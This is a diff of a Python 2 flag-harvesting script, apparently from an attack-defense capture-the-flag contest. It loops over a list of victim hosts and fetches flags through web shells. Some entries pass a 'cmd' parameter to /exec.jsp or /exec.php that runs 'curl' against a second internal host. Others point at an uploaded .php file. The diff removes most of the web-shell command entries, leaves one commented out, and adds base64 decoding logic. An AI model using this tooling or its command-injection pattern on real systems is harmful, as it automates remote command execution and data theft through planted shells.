@@ -2,6 +2,7 @@
 #-*- coding:utf-8 -*-
 import requests
 import base64
+import string
 import time
 from datetime import datetime
 '''get flag from host_flags:
@@ -12,10 +13,10 @@ type:
 '''
 
 host_flags=(
-    (1,'172.16.80.144','/wordpress/gf.txt'),
-    (2,'172.16.80.144:8080','/exec.jsp',{'cmd':'curl -s http://172.16.80.1:8000/flag.txt'}),
-    (2,'172.16.80.144','/exec.php',{'cmd':'curl -s http://172.16.80.1:8000/flag.txt'}),
-    (1,'172.16.80.145','/')
+    (1,'172.16.5.10:806','/uploadfile/user/b/1/3_1466473584.php'),
+    (1,'172.16.5.10:806','/uploadfile/user/b/1/gf6.txt'),
+    (1,'172.16.5.10:802','/templates/beez_20/gf1.txt')
+    #(2,'172.16.8.144:8080','/exec.jsp',{'cmd':'curl -s http://172.16.80.1:8000/flag.txt'})
     )
 
 '''
@@ -23,7 +24,11 @@ try to base64 decode
 '''
 def base64decode(flag_str):
     try:
-        return base64.decodestring(flag_str)
+        str_b = base64.decodestring(flag_str)
+        for x in str_b:
+            if x not in string.printable:
+                return flag_str
+        return str_b
     except:
         return flag_str
 
@@ -44,11 +49,11 @@ def get_flag(flag_log_file):
                 #send request
                 r = requests.get(url,timeout=5,params=payload,headers=headers)
                 #print flag
-                msg = '[+]%s %s::\t%s' %(datetime.now().strftime('%H:%M:%S'),host,base64decode(r.text.strip()))
+                msg = '[+]%s %s::%s:%s' %(datetime.now().strftime('%H:%M:%S'),host,r.text.strip(),base64decode(r.text.strip()))
                 f.write(msg+'\n')
                 print msg
             except Exception,e:
-                print '[-]%s %s:\tfail->%s!' %(datetime.now().strftime('%H:%M:%S'),host,str(e))
+                print '[-]%s %s:fail->%s!' %(datetime.now().strftime('%H:%M:%S'),host,str(e))
 
 
 def main():
